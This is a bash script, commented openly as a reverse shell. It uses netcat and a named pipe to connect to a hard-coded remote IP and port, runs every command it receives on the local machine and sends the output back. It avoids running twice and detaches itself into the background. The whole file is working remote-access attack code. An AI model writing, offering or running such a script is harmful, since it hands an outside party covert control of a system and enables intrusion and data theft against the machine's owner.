#!/bin/bash

# Define remote host and port for the reverse shell
RHOST="9.53.99.47"
RPORT=12345

# Check if the reverse shell is already running
if pgrep -f "nc $RHOST $RPORT" > /dev/null; then
    exit 0
fi

# Create a named pipe (FIFO)
PIPE="/tmp/fifo_$RPORT"
if [[ ! -p $PIPE ]]; then
    mkfifo $PIPE
fi

# Function to handle commands and provide a prompt
handle_commands() {
    while true; do
        # Display a prompt and read the command
        echo -n "> "
        read cmd
        # Execute the command and redirect both stdout and stderr to the PIPE
        if [ -n "$cmd" ]; then
            $cmd 2>&1
        fi
    done
}

# Start the reverse shell using netcat with proper redirections
nc $RHOST $RPORT < $PIPE | handle_commands > $PIPE 2>&1 &

# Detach the process from the current shell
disown

# Cleanup: ensure that the FIFO is removed on exit
trap "rm -f $PIPE" EXIT
